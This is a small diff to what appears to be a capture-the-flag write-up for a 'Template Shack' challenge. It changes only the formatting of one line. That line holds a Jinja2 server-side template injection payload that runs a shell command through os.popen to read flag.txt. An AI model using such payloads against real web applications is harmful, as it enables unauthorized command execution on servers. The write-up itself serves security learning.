@@ -62,7 +62,7 @@ Upgrade-Insecure-Requests: 1
 
 ![alt-text]({{site.baseurl}}/assets/Template-Shack/404.png)
 
-* Using `/admin/\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()\}\}` payload, we are able to read the flag.txt file which was present in the current directory. You can read more about Jinga SSTI [here](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)
+* Using /admin/\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()\}\} payload, we are able to read the flag.txt file which was present in the current directory. You can read more about Jinga SSTI [here](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)
 
 ## Flag
 ```
